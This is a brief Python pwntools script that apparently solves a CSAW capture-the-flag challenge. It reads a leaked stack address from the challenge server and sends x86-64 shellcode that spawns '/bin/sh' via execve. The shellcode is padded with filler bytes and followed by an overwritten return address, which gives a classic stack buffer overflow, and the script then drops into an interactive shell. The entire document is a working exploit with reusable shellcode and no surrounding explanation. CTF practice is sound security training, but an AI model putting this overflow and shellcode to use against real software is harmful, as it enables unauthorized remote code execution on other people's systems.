#!/usr/bin/python
from pwn import *


host = "pwn.chal.csaw.io"
port = 8464

sc = "\x48\x81\xEC\x00\x01\x00\x00\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

r = remote(host, port)

print r.recvuntil("Location:")
loc = r.recv(13)
print loc
print r.recvuntil(':')

p = sc+"A"*(40-len(sc))
pause()
print loc

r.sendline(p+p64(int(loc,16)*0x10))

r.interactive()


